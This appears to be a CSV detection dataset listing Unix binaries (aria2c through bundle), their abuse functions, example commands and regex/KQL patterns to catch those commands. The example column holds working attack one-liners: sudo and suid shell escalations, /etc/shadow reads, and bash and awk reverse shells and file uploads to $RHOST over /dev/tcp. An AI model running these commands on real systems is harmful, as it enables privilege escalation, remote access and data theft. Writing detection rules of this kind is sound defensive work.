Name,Function,ExampleCode,KeywordsExtracted,RegexFuzzyV7,RegexFuzzyV7_KQL,Notes
aria2c,limited-suid,"echo ""$COMMAND"" > $TF
chmod +x $TF
./aria2c --on-download-error=$TF http://x",echo chmod --on-download-error= http /aria2c,(?i)\b(?:\S*/)?aria2c.*echo.*chmod.*\-\-on\-download\-error.*http.*/aria2c,"@""(?i)\b(?:\S*/)?aria2c.*echo.*chmod.*\-\-on\-download\-error.*http.*/aria2c""",
arj,file-read,"arj a ""$TF"" ""$LFILE""
arj p ""$TF""",,(?i)\b(?:\S*/)?arj\b,"@""(?i)\b(?:\S*/)?arj\b""",
arj,file-write,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
arj e ""$TF/a"" $LDIR",echo LDIR,(?i)\b(?:\S*/)?arj.*echo.*LDIR,"@""(?i)\b(?:\S*/)?arj.*echo.*LDIR""",
arj,sudo,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
sudo arj e ""$TF/a"" $LDIR",echo sudo LDIR,(?i)\b(?:\S*/)?arj.*echo.*sudo.*LDIR,"@""(?i)\b(?:\S*/)?arj.*echo.*sudo.*LDIR""",
arj,suid,"echo DATA >""$TF/$LFILE""
arj a ""$TF/a"" ""$TF/$LFILE""
./arj e ""$TF/a"" $LDIR",echo LDIR /arj,(?i)\b(?:\S*/)?arj.*echo.*LDIR.*/arj,"@""(?i)\b(?:\S*/)?arj.*echo.*LDIR.*/arj""",
arp,file-read,"arp -v -f ""$LFILE""",,(?i)\b(?:\S*/)?arp\b,"@""(?i)\b(?:\S*/)?arp\b""",
arp,suid,"./arp -v -f ""$LFILE""",/arp,(?i)\b(?:\S*/)?arp.*/arp,"@""(?i)\b(?:\S*/)?arp.*/arp""",
arp,sudo,"sudo arp -v -f ""$LFILE""",sudo,(?i)\b(?:\S*/)?arp.*sudo,"@""(?i)\b(?:\S*/)?arp.*sudo""",
as,file-read,as @$LFILE,,(?i)\b(?:\S*/)?as\b,"@""(?i)\b(?:\S*/)?as\b""",
as,suid,./as @$LFILE,,(?i)\b(?:\S*/)?as\b,"@""(?i)\b(?:\S*/)?as\b""",
as,sudo,sudo as @$LFILE,sudo,(?i)\b(?:\S*/)?as.*sudo,"@""(?i)\b(?:\S*/)?as.*sudo""",
ascii-xfr,file-read,"ascii-xfr -ns ""$LFILE""",,(?i)\b(?:\S*/)?ascii\-xfr\b,"@""(?i)\b(?:\S*/)?ascii\-xfr\b""",
ascii-xfr,suid,"./ascii-xfr -ns ""$LFILE""",/ascii-xfr,(?i)\b(?:\S*/)?ascii\-xfr.*/ascii\-xfr,"@""(?i)\b(?:\S*/)?ascii\-xfr.*/ascii\-xfr""",
ascii-xfr,sudo,"sudo ascii-xfr -ns ""$LFILE""",sudo,(?i)\b(?:\S*/)?ascii\-xfr.*sudo,"@""(?i)\b(?:\S*/)?ascii\-xfr.*sudo""",
ascii85,file-read,"ascii85 ""$LFILE"" | ascii85 --decode","""--decode",(?i)\b(?:\S*/)?ascii85.*\-\-decode,"@""(?i)\b(?:\S*/)?ascii85.*\-\-decode""",
ascii85,sudo,"sudo ascii85 ""$LFILE"" | ascii85 --decode",sudo --decode,(?i)\b(?:\S*/)?ascii85.*sudo.*\-\-decode,"@""(?i)\b(?:\S*/)?ascii85.*sudo.*\-\-decode""",
ash,shell,ash,,(?i)\b(?:\S*/)?ash\b,"@""(?i)\b(?:\S*/)?ash\b""",
ash,file-write,ash -c 'echo DATA > $LFILE',echo,(?i)\b(?:\S*/)?ash.*echo,"@""(?i)\b(?:\S*/)?ash.*echo""",
ash,suid,./ash,/ash,(?i)\b(?:\S*/)?ash.*/ash,"@""(?i)\b(?:\S*/)?ash.*/ash""",
ash,sudo,sudo ash,sudo,(?i)\b(?:\S*/)?ash.*sudo,"@""(?i)\b(?:\S*/)?ash.*sudo""",
aspell,file-read,"aspell -c ""$LFILE""",,(?i)\b(?:\S*/)?aspell\b,"@""(?i)\b(?:\S*/)?aspell\b""",
aspell,suid,"./aspell -c ""$LFILE""",/aspell,(?i)\b(?:\S*/)?aspell.*/aspell,"@""(?i)\b(?:\S*/)?aspell.*/aspell""",
aspell,sudo,"sudo aspell -c ""$LFILE""",sudo,(?i)\b(?:\S*/)?aspell.*sudo,"@""(?i)\b(?:\S*/)?aspell.*sudo""",
at,shell,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | at now; tail -f /dev/null",echo /bin/sh tty now tail /dev/null,(?i)\b(?:\S*/)?at.*echo.*/bin/sh.*tty.*now.*tail.*/dev/null,"@""(?i)\b(?:\S*/)?at.*echo.*/bin/sh.*tty.*now.*tail.*/dev/null""",
at,command,"echo ""$COMMAND"" | at now",echo now,(?i)\b(?:\S*/)?at.*echo.*now,"@""(?i)\b(?:\S*/)?at.*echo.*now""",
at,sudo,"echo ""/bin/sh <$(tty) >$(tty) 2>$(tty)"" | sudo at now; tail -f /dev/null",echo /bin/sh tty sudo now tail /dev/null,(?i)\b(?:\S*/)?at.*echo.*/bin/sh.*tty.*sudo.*now.*tail.*/dev/null,"@""(?i)\b(?:\S*/)?at.*echo.*/bin/sh.*tty.*sudo.*now.*tail.*/dev/null""",
atobm,file-read,"atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'",awk printf,(?i)\b(?:\S*/)?atobm.*awk.*printf,"@""(?i)\b(?:\S*/)?atobm.*awk.*printf""",
atobm,sudo,"sudo atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'",sudo awk printf,(?i)\b(?:\S*/)?atobm.*sudo.*awk.*printf,"@""(?i)\b(?:\S*/)?atobm.*sudo.*awk.*printf""",
atobm,suid,"./atobm $LFILE 2>&1 | awk -F ""'"" '{printf ""%s"", $2}'",awk printf /atobm,(?i)\b(?:\S*/)?atobm.*awk.*printf.*/atobm,"@""(?i)\b(?:\S*/)?atobm.*awk.*printf.*/atobm""",
awk,shell,"awk 'BEGIN {system(""/bin/sh"")}'",BEGIN system /bin/sh,(?i)\b(?:\S*/)?awk.*BEGIN.*system.*/bin/sh,"@""(?i)\b(?:\S*/)?awk.*BEGIN.*system.*/bin/sh""",
awk,non-interactive-reverse-shell,"awk -v RHOST=$RHOST -v RPORT=$RPORT 'BEGIN {
    s = ""/inet/tcp/0/"" RHOST ""/"" RPORT;
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",RHOST= RPORT= BEGIN /inet/tcp/0/ while printf getline break print close,(?i)\b(?:\S*/)?awk.*RHOST.*RPORT.*BEGIN.*/inet/tcp/0/.*while.*printf.*getline.*break,"@""(?i)\b(?:\S*/)?awk.*RHOST.*RPORT.*BEGIN.*/inet/tcp/0/.*while.*printf.*getline.*break""",
awk,non-interactive-bind-shell,"awk -v LPORT=$LPORT 'BEGIN {
    s = ""/inet/tcp/"" LPORT ""/0/0"";
    while (1) {printf ""> "" |& s; if ((s |& getline c) <= 0) break;
    while (c && (c |& getline) > 0) print $0 |& s; close(c)}}'",LPORT= BEGIN /inet/tcp/ while printf getline break print close,(?i)\b(?:\S*/)?awk.*LPORT.*BEGIN.*/inet/tcp/.*while.*printf.*getline.*break.*print,"@""(?i)\b(?:\S*/)?awk.*LPORT.*BEGIN.*/inet/tcp/.*while.*printf.*getline.*break.*print""",
awk,file-write,"awk -v LFILE=$LFILE 'BEGIN { print ""DATA"" > LFILE }'",LFILE= BEGIN print,(?i)\b(?:\S*/)?awk.*LFILE.*BEGIN.*print,"@""(?i)\b(?:\S*/)?awk.*LFILE.*BEGIN.*print""",
awk,file-read,"awk '//' ""$LFILE""",,(?i)\b(?:\S*/)?awk\b,"@""(?i)\b(?:\S*/)?awk\b""",
awk,suid,"./awk '//' ""$LFILE""",/awk,(?i)\b(?:\S*/)?awk.*/awk,"@""(?i)\b(?:\S*/)?awk.*/awk""",
awk,sudo,"sudo awk 'BEGIN {system(""/bin/sh"")}'",sudo BEGIN system /bin/sh,(?i)\b(?:\S*/)?awk.*sudo.*BEGIN.*system.*/bin/sh,"@""(?i)\b(?:\S*/)?awk.*sudo.*BEGIN.*system.*/bin/sh""",
awk,limited-suid,"./awk 'BEGIN {system(""/bin/sh"")}'",BEGIN system /bin/sh /awk,(?i)\b(?:\S*/)?awk.*BEGIN.*system.*/bin/sh.*/awk,"@""(?i)\b(?:\S*/)?awk.*BEGIN.*system.*/bin/sh.*/awk""",
aws,shell,"aws help
!/bin/sh",help /bin/sh,(?i)\b(?:\S*/)?aws.*help.*/bin/sh,"@""(?i)\b(?:\S*/)?aws.*help.*/bin/sh""",
aws,sudo,"sudo aws help
!/bin/sh",sudo help /bin/sh,(?i)\b(?:\S*/)?aws.*sudo.*help.*/bin/sh,"@""(?i)\b(?:\S*/)?aws.*sudo.*help.*/bin/sh""",
base32,file-read,"base32 ""$LFILE"" | base32 --decode","""--decode",(?i)\b(?:\S*/)?base32.*\-\-decode,"@""(?i)\b(?:\S*/)?base32.*\-\-decode""",
base32,suid,"base32 ""$LFILE"" | base32 --decode","""--decode",(?i)\b(?:\S*/)?base32.*\-\-decode,"@""(?i)\b(?:\S*/)?base32.*\-\-decode""",
base32,sudo,"sudo base32 ""$LFILE"" | base32 --decode",sudo --decode,(?i)\b(?:\S*/)?base32.*sudo.*\-\-decode,"@""(?i)\b(?:\S*/)?base32.*sudo.*\-\-decode""",
base58,file-read,"base58 ""$LFILE"" | base58 --decode","""--decode",(?i)\b(?:\S*/)?base58.*\-\-decode,"@""(?i)\b(?:\S*/)?base58.*\-\-decode""",
base58,sudo,"sudo base58 ""$LFILE"" | base58 --decode",sudo --decode,(?i)\b(?:\S*/)?base58.*sudo.*\-\-decode,"@""(?i)\b(?:\S*/)?base58.*sudo.*\-\-decode""",
base64,file-read,"base64 ""$LFILE"" | base64 --decode","""--decode",(?i)\b(?:\S*/)?base64.*\-\-decode,"@""(?i)\b(?:\S*/)?base64.*\-\-decode""",
base64,suid,"./base64 ""$LFILE"" | base64 --decode","""--decode /base64",(?i)\b(?:\S*/)?base64.*\-\-decode.*/base64,"@""(?i)\b(?:\S*/)?base64.*\-\-decode.*/base64""",
base64,sudo,"sudo base64 ""$LFILE"" | base64 --decode",sudo --decode,(?i)\b(?:\S*/)?base64.*sudo.*\-\-decode,"@""(?i)\b(?:\S*/)?base64.*sudo.*\-\-decode""",
basenc,file-read,basenc --base64 $LFILE | basenc -d --base64,"""--base64",(?i)\b(?:\S*/)?basenc.*\-\-base64,"@""(?i)\b(?:\S*/)?basenc.*\-\-base64""",
basenc,suid,basenc --base64 $LFILE | basenc -d --base64,"""--base64",(?i)\b(?:\S*/)?basenc.*\-\-base64,"@""(?i)\b(?:\S*/)?basenc.*\-\-base64""",
basenc,sudo,sudo basenc --base64 $LFILE | basenc -d --base64,sudo --base64,(?i)\b(?:\S*/)?basenc.*sudo.*\-\-base64,"@""(?i)\b(?:\S*/)?basenc.*sudo.*\-\-base64""",
basez,file-read,"basez ""$LFILE"" | basez --decode","""--decode",(?i)\b(?:\S*/)?basez.*\-\-decode,"@""(?i)\b(?:\S*/)?basez.*\-\-decode""",
basez,suid,"./basez ""$LFILE"" | basez --decode","""--decode /basez",(?i)\b(?:\S*/)?basez.*\-\-decode.*/basez,"@""(?i)\b(?:\S*/)?basez.*\-\-decode.*/basez""",
basez,sudo,"sudo basez ""$LFILE"" | basez --decode",sudo --decode,(?i)\b(?:\S*/)?basez.*sudo.*\-\-decode,"@""(?i)\b(?:\S*/)?basez.*sudo.*\-\-decode""",
bash,shell,bash,,(?i)\b(?:\S*/)?bash\b,"@""(?i)\b(?:\S*/)?bash\b""",
bash,reverse-shell,bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1',exec /dev/tcp/ RHOST/,(?i)\b(?:\S*/)?bash.*exec.*/dev/tcp/.*RHOST/,"@""(?i)\b(?:\S*/)?bash.*exec.*/dev/tcp/.*RHOST/""",
bash,file-upload,"bash -c 'echo -e ""POST / HTTP/0.9\n\n$(<$LFILE)"" > /dev/tcp/$RHOST/$RPORT'",echo POST HTTP/0.9 /dev/tcp/ RHOST/,(?i)\b(?:\S*/)?bash.*echo.*POST.*HTTP/0\.9.*/dev/tcp/.*RHOST/,"@""(?i)\b(?:\S*/)?bash.*echo.*POST.*HTTP/0\.9.*/dev/tcp/.*RHOST/""",
bash,file-upload,bash -c 'cat $LFILE > /dev/tcp/$RHOST/$RPORT',cat /dev/tcp/ RHOST/,(?i)\b(?:\S*/)?bash.*cat.*/dev/tcp/.*RHOST/,"@""(?i)\b(?:\S*/)?bash.*cat.*/dev/tcp/.*RHOST/""",
bash,file-download,"bash -c '{ echo -ne ""GET /$LFILE HTTP/1.0\r\nhost: $RHOST\r\n\r\n"" 1>&3; cat 0<&3; } \
    3<>/dev/tcp/$RHOST/$RPORT \
    | { while read -r; do [ ""$REPLY"" = ""$(echo -ne ""\r"")"" ] && break; done; cat; } > $LFILE'",echo GET HTTP/1.0 nhost cat /dev/tcp/ RHOST/ while read REPLY break done,(?i)\b(?:\S*/)?bash.*echo.*GET.*HTTP/1\.0.*nhost.*cat.*/dev/tcp/.*RHOST/.*while,"@""(?i)\b(?:\S*/)?bash.*echo.*GET.*HTTP/1\.0.*nhost.*cat.*/dev/tcp/.*RHOST/.*while""",
bash,file-download,bash -c 'cat < /dev/tcp/$RHOST/$RPORT > $LFILE',cat /dev/tcp/ RHOST/,(?i)\b(?:\S*/)?bash.*cat.*/dev/tcp/.*RHOST/,"@""(?i)\b(?:\S*/)?bash.*cat.*/dev/tcp/.*RHOST/""",
bash,file-write,bash -c 'echo DATA > $LFILE',echo,(?i)\b(?:\S*/)?bash.*echo,"@""(?i)\b(?:\S*/)?bash.*echo""",
bash,file-write,"history -c
DATA
history -w $LFILE",history,(?i)\b(?:\S*/)?bash.*history,"@""(?i)\b(?:\S*/)?bash.*history""",
bash,file-read,"bash -c 'echo ""$(<$LFILE)""'",echo,(?i)\b(?:\S*/)?bash.*echo,"@""(?i)\b(?:\S*/)?bash.*echo""",
bash,file-read,"history -r $LFILE
history",history,(?i)\b(?:\S*/)?bash.*history,"@""(?i)\b(?:\S*/)?bash.*history""",
bash,library-load,bash -c 'enable -f ./lib.so x',enable ./lib.so /lib.so,(?i)\b(?:\S*/)?bash.*enable.*\./lib\.so.*/lib\.so,"@""(?i)\b(?:\S*/)?bash.*enable.*\./lib\.so.*/lib\.so""",
bash,suid,./bash -p,/bash,(?i)\b(?:\S*/)?bash.*/bash,"@""(?i)\b(?:\S*/)?bash.*/bash""",
bash,sudo,sudo bash,sudo,(?i)\b(?:\S*/)?bash.*sudo,"@""(?i)\b(?:\S*/)?bash.*sudo""",
batcat,shell,"batcat --paging always /etc/profile
!/bin/sh","""--paging always /etc/profile /bin/sh",(?i)\b(?:\S*/)?batcat.*\-\-paging.*always.*/etc/profile.*/bin/sh,"@""(?i)\b(?:\S*/)?batcat.*\-\-paging.*always.*/etc/profile.*/bin/sh""",
batcat,limited-suid,"./batcat --paging always /etc/profile
!/bin/sh","""--paging always /etc/profile /bin/sh /batcat",(?i)\b(?:\S*/)?batcat.*\-\-paging.*always.*/etc/profile.*/bin/sh.*/batcat,"@""(?i)\b(?:\S*/)?batcat.*\-\-paging.*always.*/etc/profile.*/bin/sh.*/batcat""",
batcat,sudo,"sudo batcat --paging always /etc/profile
!/bin/sh",sudo --paging always /etc/profile /bin/sh,(?i)\b(?:\S*/)?batcat.*sudo.*\-\-paging.*always.*/etc/profile.*/bin/sh,"@""(?i)\b(?:\S*/)?batcat.*sudo.*\-\-paging.*always.*/etc/profile.*/bin/sh""",
bc,file-read,"bc -s $LFILE
quit",quit,(?i)\b(?:\S*/)?bc.*quit,"@""(?i)\b(?:\S*/)?bc.*quit""",
bc,sudo,"sudo bc -s $LFILE
quit",sudo quit,(?i)\b(?:\S*/)?bc.*sudo.*quit,"@""(?i)\b(?:\S*/)?bc.*sudo.*quit""",
bc,suid,"./bc -s $LFILE
quit",quit,(?i)\b(?:\S*/)?bc.*quit,"@""(?i)\b(?:\S*/)?bc.*quit""",
bconsole,shell,"bconsole
@exec /bin/sh",exec /bin/sh,(?i)\b(?:\S*/)?bconsole.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?bconsole.*exec.*/bin/sh""",
bconsole,sudo,"sudo bconsole
@exec /bin/sh",sudo exec /bin/sh,(?i)\b(?:\S*/)?bconsole.*sudo.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?bconsole.*sudo.*exec.*/bin/sh""",
bconsole,file-read,bconsole -c /etc/shadow,/etc/shadow,(?i)\b(?:\S*/)?bconsole.*/etc/shadow,"@""(?i)\b(?:\S*/)?bconsole.*/etc/shadow""",
bpftrace,sudo,"sudo bpftrace -e 'BEGIN {system(""/bin/sh"");exit()}'",sudo BEGIN system /bin/sh exit,(?i)\b(?:\S*/)?bpftrace.*sudo.*BEGIN.*system.*/bin/sh.*exit,"@""(?i)\b(?:\S*/)?bpftrace.*sudo.*BEGIN.*system.*/bin/sh.*exit""",
bpftrace,sudo,"echo 'BEGIN {system(""/bin/sh"");exit()}' >$TF
sudo bpftrace $TF",echo BEGIN system /bin/sh exit sudo,(?i)\b(?:\S*/)?bpftrace.*echo.*BEGIN.*system.*/bin/sh.*exit.*sudo,"@""(?i)\b(?:\S*/)?bpftrace.*echo.*BEGIN.*system.*/bin/sh.*exit.*sudo""",
bpftrace,sudo,sudo bpftrace -c /bin/sh -e 'END {exit()}',sudo /bin/sh END exit,(?i)\b(?:\S*/)?bpftrace.*sudo.*/bin/sh.*END.*exit,"@""(?i)\b(?:\S*/)?bpftrace.*sudo.*/bin/sh.*END.*exit""",
bridge,file-read,"bridge -b ""$LFILE""",,(?i)\b(?:\S*/)?bridge\b,"@""(?i)\b(?:\S*/)?bridge\b""",
bridge,suid,"./bridge -b ""$LFILE""",/bridge,(?i)\b(?:\S*/)?bridge.*/bridge,"@""(?i)\b(?:\S*/)?bridge.*/bridge""",
bridge,sudo,"sudo bridge -b ""$LFILE""",sudo,(?i)\b(?:\S*/)?bridge.*sudo,"@""(?i)\b(?:\S*/)?bridge.*sudo""",
bundle,shell,"bundle help
!/bin/sh",help /bin/sh,(?i)\b(?:\S*/)?bundle.*help.*/bin/sh,"@""(?i)\b(?:\S*/)?bundle.*help.*/bin/sh""",
bundle,shell,bundle exec /bin/sh,exec /bin/sh,(?i)\b(?:\S*/)?bundle.*exec.*/bin/sh,"@""(?i)\b(?:\S*/)?bundle.*exec.*/bin/sh""",
